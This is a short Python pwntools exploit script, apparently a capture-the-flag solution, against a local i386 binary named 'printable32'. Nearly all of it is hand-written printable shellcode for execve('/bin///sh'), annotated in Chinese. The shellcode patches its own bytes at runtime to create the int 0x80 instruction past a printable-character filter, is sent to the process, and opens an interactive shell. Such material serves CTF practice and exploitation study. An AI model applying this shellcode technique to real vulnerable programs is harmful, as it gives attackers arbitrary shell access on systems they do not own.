from pwn import *
context(arch = 'i386', os = 'linux')

io = process("./printable32")

def debug():
	gdb.attach(io)
	pause()

mmap = 0xf7fd4000
shellcode = '''
        /* execve(/bin///sh, NULL, NULL) */
        /* ebx 最初为0, 设置 ecx = 0 */
	push ebx
	pop ecx
	
	/* 设置 ebx -> "/bin///sh" */
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
	push esp
        pop ebx

        /* 构造 int 0x80 -> \xcd\x80 */
        /* eax ecx 指向的就是 shellcode 的开始地址 */
        /* -51 == FFFFFFCD  -128 == FFFFFF80 */
        /* 33 - 84 = 0x21 - 0x54 = -51 */
        /* 0x40 - 0x60 -  0x60=  -128 */
        /* shellcode+0x34/0x35 --> \xcd\x80  */
        push 0x54
        pop edx
        sub byte ptr[eax+0x27], dl
        push 0x60
        pop edx
        sub byte ptr[eax+0x28], dl
        sub byte ptr[eax+0x28], dl

        /* 设置 edx = 0 */
        push ecx
        pop edx

        /* 设置 eax 为系统调用号 0xb = 11*/
        push edx
        pop eax
        xor al, 0x50
        xor al, 0x5b
'''
shellcode = asm(shellcode) + b'\x21\x40'
print(hex(len(shellcode) - 2))
print(shellcode)
#debug()
io.sendline(shellcode)

io.interactive()
